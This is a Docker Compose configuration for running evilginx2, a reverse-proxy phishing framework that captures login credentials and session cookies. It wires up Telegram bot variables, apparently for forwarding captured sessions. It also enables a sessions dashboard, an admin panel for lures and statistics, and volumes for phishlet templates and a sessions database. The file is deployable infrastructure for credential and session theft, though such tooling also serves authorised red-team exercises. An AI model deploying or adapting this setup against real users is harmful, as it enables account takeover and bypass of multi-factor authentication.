services:
  evilginx:
    build: .
    image: evilginx2:latest
    container_name: evilginx2
    restart: unless-stopped

    tty: true
    stdin_open: true

    network_mode: host

    environment:
      - TZ=${TZ:-UTC}
      - TG_BOT_TOKEN=${TG_BOT_TOKEN:-}
      - TG_CHAT_ID=${TG_CHAT_ID:-}
      # ---- Simple sessions dashboard (port 5000) ----
      - DASHBOARD_ADDR=${DASHBOARD_ADDR:-0.0.0.0:5000}
      - DASHBOARD_USER=${DASHBOARD_USER:-admin}
      - DASHBOARD_PASS=${DASHBOARD_PASS:-}
      - DASHBOARD_ENABLED=${DASHBOARD_ENABLED:-true}
      # ---- Full web admin panel (login page, users, stats, lures) ----
      # Port it listens on. Set to "0" to disable it completely.
      - WEBAPI_PORT=${WEBAPI_PORT:-8082}

    volumes:
      # phishlet .yml files (seeded from image on first run)
      - ./phishlets:/app/phishlets
      # config, sessions database, certs, geoip
      - ./data:/home/evilginx/.evilginx
